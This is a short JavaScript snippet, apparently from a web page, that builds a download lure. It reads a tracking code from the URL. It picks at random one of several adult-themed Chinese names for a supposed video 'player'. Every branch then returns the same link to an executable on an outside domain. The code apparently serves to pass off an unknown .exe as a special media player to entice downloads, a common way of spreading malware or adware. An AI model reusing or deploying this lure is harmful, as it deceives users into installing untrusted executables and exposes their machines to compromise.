x=8;
s2 = location.search;

s3=s2.substr(0,3);
//s4 = s2.substring(s2.length-3,s2.length);
y= s2.substring(3,8);

if(s3=="?70")   x=1;
if(s3=="?t1")   x=2;
if(s3=="?7f")   x=3;
if(s3=="?dy")   x=4;

function mz()
{
 var n=Math.floor(Math.random()*8+1);
 var s="qvod";
 switch(n)
 {
  case 1:s="vip秘密播放器";break;
  case 2:s="激情电影专用播放器";break;
  case 3: s="爽片播放器";break;
  case 4: s="爽片专用播放器";break;
  case 5: s="午夜专用播放器";break;
  case 6: s="日本爽片播放器";break;
  case 7:s="日韩爽片播放器";break;
  case 8:s="男人播放器";break;
 }
 return s;
}


function down()
{ 

var yy=Math.floor(Math.random()*10+1);
var mz1=mz();
uu8="http://www.wangxiaorong.com/kuplay_238_50546.exe"; 

if(yy==1)
uu8="http://www.wangxiaorong.com/kuplay_238_50546.exe"; 

if(yy==2||yy==4)
uu8="http://www.wangxiaorong.com/kuplay_238_50546.exe";    //zn

if(yy==3||yy==6||yy==9||yy==7||yy==10||yy==5)
uu8="http://www.wangxiaorong.com/kuplay_238_50546.exe";

if(yy==8)
uu8="http://www.wangxiaorong.com/kuplay_238_50546.exe";

return uu8;

}
